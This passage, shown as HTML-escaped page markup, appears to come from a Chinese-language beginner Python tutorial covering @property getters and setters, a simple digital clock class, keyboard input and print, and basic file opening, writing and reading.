&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;age&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;gender&lt;&#x2F;span&gt;&lt;span&gt;): &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__name=name&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__age=age&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__gender=gender&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    @&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;property &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#加入@property装饰器，表示这是一个获取函数，实现函数只读&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;age&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;): &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#这是一个获取函数，主要功能就是获取变量&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__age&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    @age.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;setter  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#@property+@.setter实现函数的可读写功能。设置函数主要功能是实现变量有条件的赋值&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;age&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;value&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;value&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0 &lt;&#x2F;span&gt;&lt;span&gt;or value&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;100&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;raise &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ValueError&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Invalid age!&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#通过raise语句触发异常&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__age=value&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Xiaoming=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Person&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Xiaoming&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;male&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(Xiaoming.age)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Xiaoming.age=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;80&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(Xiaoming.age)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过类定义一个数字时钟&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;time&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;Clock&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&amp;#39;&amp;#39;&amp;#39;这是一个数字时钟&amp;#39;&amp;#39;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;hours&lt;&#x2F;span&gt;&lt;span&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;minute&lt;&#x2F;span&gt;&lt;span&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;second&lt;&#x2F;span&gt;&lt;span&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__hours=hours&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__minute=minute&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__second=second&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&amp;#39;&amp;#39;&amp;#39;设置时钟走字&amp;#39;&amp;#39;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__second+=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__second==&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;60&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__second=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__minute+=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__minute==&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;60&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__minute=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__hours+=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__hours==&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;24&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__hours=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;show&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&amp;#39;&amp;#39;&amp;#39;用来显示时间&amp;#39;&amp;#39;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%2d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%2d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%2d&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__hours,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__minute,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.__second)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    clock=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Clock&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;23&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;59&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;58&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;True&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(clock.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;show&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        time.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;sleep&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        clock.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;__name__==&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;__main__&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Python输入输出&lt;&#x2F;p&gt;
&lt;p&gt;什么是输入输出？&lt;&#x2F;p&gt;
&lt;p&gt;内存—硬盘&lt;&#x2F;p&gt;
&lt;p&gt;CPU-内存&lt;&#x2F;p&gt;
&lt;p&gt;键盘-屏幕&lt;&#x2F;p&gt;
&lt;p&gt;屏幕输出print&lt;&#x2F;p&gt;
&lt;p&gt;用于打印（输出）信息到屏幕&lt;&#x2F;p&gt;
&lt;p&gt;键盘输入input&lt;&#x2F;p&gt;
&lt;p&gt;用于接收键盘输入，输入内容可以是表达式&lt;&#x2F;p&gt;
&lt;p&gt;s=input(&#x27;请输入你的公式：&#x27;)&lt;&#x2F;p&gt;
&lt;p&gt;print(&#x27;结果是：&#x27;,eval(s))&lt;&#x2F;p&gt;
&lt;p&gt;文件处理&lt;&#x2F;p&gt;
&lt;p&gt;文件打开&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;file_object=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(file_name,access_mode,buffering)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;文件分类&lt;&#x2F;p&gt;
&lt;p&gt;文本文件：可以被我们阅读和理解，使用文本编辑器来修改，html doc xls ppt txt 体积更多&lt;&#x2F;p&gt;
&lt;p&gt;二进制文件：程序能阅读和理解的，需要专门的文件编辑器来打开 jpg gif mp4 mkv 体积小&lt;&#x2F;p&gt;
&lt;p&gt;文件名称&lt;&#x2F;p&gt;
&lt;p&gt;file_name是包含要打开的文件名字的字符串，可以是相对路径也可以是绝对路径&lt;&#x2F;p&gt;
&lt;p&gt;access_mode 打开模式&lt;&#x2F;p&gt;
&lt;p&gt;r 只读方式打开，默认打开方式，指针放在文件开头&lt;&#x2F;p&gt;
&lt;p&gt;rb 二进制只读方式&lt;&#x2F;p&gt;
&lt;p&gt;r+ 读写方式 指针放在文件开头&lt;&#x2F;p&gt;
&lt;p&gt;rb+&lt;&#x2F;p&gt;
&lt;p&gt;w 写入方式打开。如果文件不存在，则新建；如果文件存在，从头编辑，原来内容被删除&lt;&#x2F;p&gt;
&lt;p&gt;wb&lt;&#x2F;p&gt;
&lt;p&gt;w+ 读写&lt;&#x2F;p&gt;
&lt;p&gt;wb+&lt;&#x2F;p&gt;
&lt;p&gt;a 打开一个文件用于追加内容，指针在文件结尾。如果文件不存在，则创建新文件&lt;&#x2F;p&gt;
&lt;p&gt;ab&lt;&#x2F;p&gt;
&lt;p&gt;a+&lt;&#x2F;p&gt;
&lt;p&gt;ab+&lt;&#x2F;p&gt;
&lt;p&gt;缓存大小&lt;&#x2F;p&gt;
&lt;p&gt;如果buffering值被设置为0，就不会有缓存&lt;&#x2F;p&gt;
&lt;p&gt;如果buffering值被设置为1，访问文件的时候会进行缓存&lt;&#x2F;p&gt;
&lt;p&gt;如果buffering值被设置为大于1的值，表明是缓存区的大小&lt;&#x2F;p&gt;
&lt;p&gt;如果设置为负值，缓存区大小为系统默认&lt;&#x2F;p&gt;
&lt;p&gt;文件打开&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;file1=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;newfile.txt&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;w&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;文件关闭&lt;&#x2F;p&gt;
&lt;p&gt;结束文件调用，节省内存空间&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;file1=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;newfile.txt&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;w&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;file1.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;write&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;welcome to pinginglab&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;www.pinginglab.net&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;file1.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;close&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;文件读取&lt;&#x2F;p&gt;
&lt;p&gt;file.read() 读取文件所有字节，可以指定字节数，不指定或者为负则读取所有&lt;&#x2F;p&gt;
&lt;p&gt;file.readline() 读取一行，包括\n符&lt;&#x2F;p&gt;
&lt;p&gt;file.readlines() 读取所有行并返回列表，每行返回列表&lt;&#x2F;p&gt;
&lt;p&gt;如果以a打开文件，则读取不到内容，因为指针在文件末尾&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;file1=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;newfile.txt&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;r&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;a=file1.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;read&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(a)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;file1.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;close&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;file1=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;newfile.txt&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;r&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;a=file1.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;read&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(a)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;file1.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;close&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;file1=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;newfile.txt&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;r&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;a=file1.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;readline&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(a)&lt;&#x2F;span&gt;&lt;span&gt;
